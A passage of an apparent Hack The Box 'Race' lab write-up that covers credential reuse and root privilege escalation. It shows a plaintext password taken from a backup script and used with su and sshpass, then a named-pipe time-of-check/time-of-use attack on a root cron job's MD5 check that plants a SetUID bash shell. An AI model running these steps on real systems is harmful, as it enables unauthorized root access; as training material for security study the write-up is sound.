+<span class="go">d15804b944b40ca8540d37ed6bd80906  offsite-backup.sh
+d15804b944b40ca8540d37ed6bd80906  backup/offsite-backup.sh
+</span></code></pre></div></div>
+<p>The script has a new subdomain, as well as old creds for max:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="nv">OFFSITE_HOST</span><span class="o">=</span><span class="s2">"offsite-backup.race.vl"</span>
+<span class="nv">SOURCE_DIR</span><span class="o">=</span><span class="s2">"/var/www/html/racers/backup/"</span>
+<span class="c"># Disabled USER/PASS for security reasons. Will be provided via environment from cron.</span>
+<span class="c"># OFFSITE_USER="max"</span>
+<span class="c"># OFFSITE_PASS="ruxai0GaemaS1Rah"</span>
+/usr/bin/curl <span class="nt">--insecure</span> <span class="nt">--connect-timeout</span> 60 <span class="nt">-u</span> <span class="nv">$OFFSITE_USER</span>:<span class="nv">$OFFSITE_PASS</span> <span class="nt">-T</span> <span class="nv">$SOURCE_DIR</span> sftp://<span class="nv">$OFFSITE_HOST</span>/backups/
+</code></pre></div></div>
+<h3 id="creds">Creds</h3>
+<p>The creds work for max with <code class="language-plaintext highlighter-rouge">su</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@race:/usr/local/share/race-scripts$</span><span class="w"> </span>su - max
+<span class="go">Password: 
+</span><span class="gp">max@race:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>They also work over SSH:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> ruxai0GaemaS1Rah ssh max@10.129.234.211
+<span class="go">Warning: Permanently added '10.129.234.211' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)
+...[snip]...
+</span><span class="gp">max@race:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And I’ll grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">80b27c66************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>I’ve already explored both home directories. max is in the racers group:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:~$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1001(max) gid=1001(max) groups=1001(max),1002(racers)
+</span></code></pre></div></div>
+<p>The only files / directories in this group are the <code class="language-plaintext highlighter-rouge">race-script</code> directory I found earlier:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:~$</span><span class="w"> </span>find / <span class="nt">-group</span> racers 2&gt;/dev/null
+<span class="go">/usr/local/share/race-scripts
+/usr/local/share/race-scripts/backup
+/usr/local/share/race-scripts/backup/offsite-backup.sh
+</span></code></pre></div></div>
+<p>Looking at running processes, nothing jumps out. I’ll upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> using <code class="language-plaintext highlighter-rouge">scp</code>:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> ruxai0GaemaS1Rah scp /opt/pspy/pspy64 max@10.129.234.211:/dev/shm/pspy64
+</code></pre></div></div>
+<p>I’ll run it and wait a few minutes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:~$</span><span class="w"> </span>/dev/shm/pspy64
+<span class="go">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+...[snip]...
+</span></code></pre></div></div>
+<p>Every minute, it runs <code class="language-plaintext highlighter-rouge">offsite-backup.sh</code> from <code class="language-plaintext highlighter-rouge">cron</code> via <code class="language-plaintext highlighter-rouge">secure-cron-runner.sh</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2025/08/29 20:26:01 CMD: UID=0     PID=15850  | /usr/sbin/CRON -f -P 
+2025/08/29 20:26:01 CMD: UID=0     PID=15853  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh 
+2025/08/29 20:26:01 CMD: UID=0     PID=15851  | /bin/sh -c /usr/local/bin/secure-cron-runner.sh &gt;/dev/null 2&gt;/dev/null 
+2025/08/29 20:26:01 CMD: UID=0     PID=15857  | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">secure-cron-runner.sh</code> is pretty straight forward:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="c">## If scripts need environment variables put them into below file</span>
+<span class="c">## so that no one can see them.</span>
+<span class="nb">.</span> /root/conf/secure-cron-runner.env
+
+<span class="nb">declare</span> <span class="nt">-a</span> scripts
+<span class="nb">declare</span> <span class="nt">-a</span> sigs
+
+<span class="c">## 0 = offsite-backup by max</span>
+scripts[0]<span class="o">=</span><span class="s2">"/usr/local/share/race-scripts/offsite-backup.sh"</span>
+sigs[0]<span class="o">=</span><span class="s2">"d15804b944b40ca8540d37ed6bd80906"</span>
+<span class="c">## add other scripts below</span>
+<span class="c"># scripts[1]="&lt;path-to-script&gt;"</span>
+<span class="c"># sigs[1]="&lt;md5sum&gt;"</span>
+<span class="c"># scripts[2]="&lt;path-to-script&gt;"</span>
+<span class="c"># sigs[2]="&lt;md5sum&gt;"</span>
+
+<span class="nv">elems</span><span class="o">=</span><span class="k">${#</span><span class="nv">scripts</span><span class="p">[@]</span><span class="k">}</span>
+
+<span class="k">for</span> <span class="o">((</span> <span class="nv">j</span><span class="o">=</span>0<span class="p">;</span> j&lt;<span class="k">${</span><span class="nv">elems</span><span class="k">}</span><span class="p">;</span> j++ <span class="o">))</span> <span class="p">;</span> <span class="k">do
+  </span><span class="nv">sig</span><span class="o">=</span><span class="si">$(</span>/usr/bin/md5sum <span class="k">${</span><span class="nv">scripts</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="k">}</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span>
+  <span class="k">if</span> <span class="o">[[</span> <span class="s2">"x</span><span class="nv">$sig</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"x</span><span class="k">${</span><span class="nv">sigs</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+    <span class="c"># echo "Script is safe. Running it." &gt;&gt; /var/log/secure-cron-runner.log</span>
+    <span class="k">${</span><span class="nv">scripts</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="k">}</span>
+  <span class="k">else</span>
+    <span class="c"># echo "Script is not safe. Skipping it. Please contact patrick to update signature." &gt;&gt; /var/log/secure-cron-runner.log</span>
+    :
+  <span class="k">fi
+done</span>
+</code></pre></div></div>
+<p>It hardcodes MD5 hashes of scripts which is checks right before running them. If it doesn’t match, it doesn’t run, and instead logs the error.</p>
+<h3 id="toctou">TOCTOU</h3>
+<h4 id="strategy">Strategy</h4>
+<p>There’s a tiny gap between when the hash is calculated and when the script is run. max has ownership over this directory and the scripts in it, so I can change the contents. That leaves a gap for me to change the contents of the script to run what I want. This is a time of check / time of use (TOCTOU) vulnerability.</p>
+<p>The initial script is owned by root:root, and I can’t write to it, so I’ll just delete it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 8
+drwxr-sr-x 2 root racers 4096 Dec  9  2023 backup
+-rwxr-xr-x 1 root root    361 Dec  5  2023 offsite-backup.sh
+</span><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">rm </span>offsite-backup.sh 
+<span class="go">rm: remove write-protected regular file 'offsite-backup.sh'? y
+</span><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backup
+</span></code></pre></div></div>
+<p>I initially played with a loop trying to constantly change the script back and forth, but this isn’t very reliable. I did make a loop and leave it running and after about 15 minutes got a reverse shell, but there’s a better way. I’ll use a named pipe to block execution of the <code class="language-plaintext highlighter-rouge">md5sum</code> command until I can replace the file and then let it continue.</p>
+<h4 id="named-pipe-demo">Named Pipe Demo</h4>
+<p>If I create a pipe and then try to get the <code class="language-plaintext highlighter-rouge">md5sum</code> of it, it will hang until there’s something in the pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">mkfifo </span>x
+<span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">md5sum </span>x
+<span class="go">
+</span></code></pre></div></div>
+<p>In another terminal, I’ll write something:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> x
+</code></pre></div></div>
+<p>As soon as I do, it completes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">md5sum </span>x
+<span class="go">d8e8fca2dc0f896fd7cb4cb0031ba249  x
+</span></code></pre></div></div>
+<p>And the output matches the input to the pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"test"</span> | <span class="nb">md5sum</span>
+<span class="go">d8e8fca2dc0f896fd7cb4cb0031ba249  -
+</span></code></pre></div></div>
+<p>I’ll try this again with another pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">mkfifo </span>y
+<span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">md5sum </span>y
+<span class="go">
+</span></code></pre></div></div>
+<p>It hangs. In the other terminal, I’ll move <code class="language-plaintext highlighter-rouge">y</code> to <code class="language-plaintext highlighter-rouge">z</code>, and then write to it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">mv </span>y z
+<span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"test"</span> <span class="o">&gt;</span> z
+</code></pre></div></div>
+<p>As soon as I write to <code class="language-plaintext highlighter-rouge">z</code>, the <code class="language-plaintext highlighter-rouge">md5sum</code> returns:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">md5sum </span>y
+<span class="go">d8e8fca2dc0f896fd7cb4cb0031ba249  y
+</span></code></pre></div></div>
+<p>This is because once the system gets a handle to the object, even if the file name changes, it’s still reading from that object.</p>
+<p>So to attack this, I’m going to create the script as a pipe and wait for <code class="language-plaintext highlighter-rouge">md5sum</code> to try to read from it and hang. Then I’ll move the script to something else, and put my malicious script in place. Then I’ll write the legit script into the pipe so the MD5 hash comes back right, and then my script is run.</p>
+<h4 id="exploit">Exploit</h4>
+<p>I’ll start by making a pipe with the script name:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">mkfifo </span>offsite-backup.sh
+</code></pre></div></div>
+<p>I’ll wait until the next minute, and then check the process list:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span>ps auxww
+<span class="go">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND   
+...[snip]...
+root      270112  0.0  0.0   7372  1592 ?        S    20:48   0:00 /usr/bin/bash /usr/local/bin/secure-cron-runner.sh
+root      270113  0.0  0.0   5784  1040 ?        S    20:48   0:00 /usr/bin/md5sum /usr/local/share/race-scripts/offsite-backup.sh
+...[snip]...
+</span></code></pre></div></div>
+<p>Now I’ll move the pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">mv </span>offsite-backup.sh pipe
+</code></pre></div></div>
+<p>And create a malicious script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/0xdf'</span> | <span class="nb">tee </span>offsite-backup.sh
+<span class="c">#!/bin/bash
+</span><span class="go">
+cp /bin/bash /tmp/0xdf
+chmod 6777 /tmp/0xdf
+</span><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">chmod</span> +x offsite-backup.sh 
+</code></pre></div></div>
+<p>I’ll write to the pipe:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">cat </span>backup/offsite-backup.sh <span class="o">&gt;</span> pipe 
+<span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf 
+<span class="go">-rwsrwsrwx 1 root root 1396520 Aug 29 20:51 /tmp/0xdf
+</span></code></pre></div></div>
+<p>And there’s a SetUID / SetGID <code class="language-plaintext highlighter-rouge">bash</code> for me. I’ll get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">max@race:/usr/local/share/race-scripts$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="gp">0xdf-5.1#</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.1# </span><span class="nb">cat</span> /root/root.txt
+<span class="go">372abde9************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/09/02/htb-race.html"></a>
+</article>
